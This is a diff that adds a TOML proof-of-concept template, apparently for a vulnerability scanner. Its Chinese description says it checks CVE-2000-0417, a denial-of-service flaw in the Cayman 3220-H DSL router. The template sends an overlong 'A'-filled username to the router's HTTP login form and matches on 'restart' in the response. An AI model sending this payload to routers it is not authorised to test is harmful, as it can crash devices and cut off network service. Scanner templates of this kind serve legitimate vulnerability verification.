@@ -1,0 +1,32 @@
+[info]
+author = "AVE"
+description = "验证Cayman 3220-H DSL路由器HTTP管理接口拒绝服务漏洞。发送79个字符以上超长用户名到管理接口登录表单，可导致路由器立即重启。"
+id = "POC-AVE-2000-0342"
+name = "Cayman 3220-H DSL Router HTTP管理接口拒绝服务漏洞 PoC"
+severity = "medium"
+tags = ["cve-2000-0417"]
+vuln_id = [
+    "CVE-2000-0417",
+    "AVE-2000-0342",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/"
+protocol = "http"
+
+[poc.requests.body]
+content = "username=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&password=test"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["restart"]
